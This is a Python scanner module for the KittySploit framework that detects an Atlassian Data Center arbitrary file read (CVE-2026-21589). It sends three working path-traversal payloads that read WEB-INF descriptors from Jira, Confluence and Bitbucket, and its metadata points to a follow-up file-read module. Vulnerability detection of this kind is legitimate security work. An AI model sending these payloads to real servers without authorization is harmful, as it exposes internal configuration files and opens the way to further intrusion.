#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-21589 — Atlassian Data Center webresource file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Atlassian CVE-2026-21589 webresource LFI detect",
        "description": (
            "Unauthenticated read of WEB-INF descriptors via :: traversal on "
            "Jira, Confluence, or Bitbucket download resources."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-21589"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-21589",
            "https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html",
        ],
        "tags": ["atlassian", "jira", "confluence", "bitbucket", "lfi", "cve-2026-21589"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/atlassian_cve_2026_21589_file_read",
                ],
            },
        },
    }

    _PROBES = (
        (
            "jira",
            "download/resources/jira.webresources:color-picker-popup/images/"
            "..::..::..::..::..::WEB-INF::web.xml",
            "com.atlassian.jira.web.ServletContextProviderListener",
        ),
        (
            "confluence",
            "s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/"
            "..::..::..::..::..::..::..::..::WEB-INF::web.xml",
            "com.atlassian.confluence.impl.webapp.ServletsInitializer",
        ),
        (
            "bitbucket",
            "s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:"
            "avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml",
            "com.atlassian.plugin.servlet.ResourceDownloadUtils",
        ),
    )

    def run(self):
        for product, path, marker in self._PROBES:
            r = self.http_request(method="GET", path=f"/{path}", allow_redirects=False)
            if not r or int(r.status_code) != 200:
                continue
            body = r.text or ""
            if marker in body:
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-21589",
                    reason=f"Arbitrary file read — {product}",
                    product=product,
                )
                return True
        return False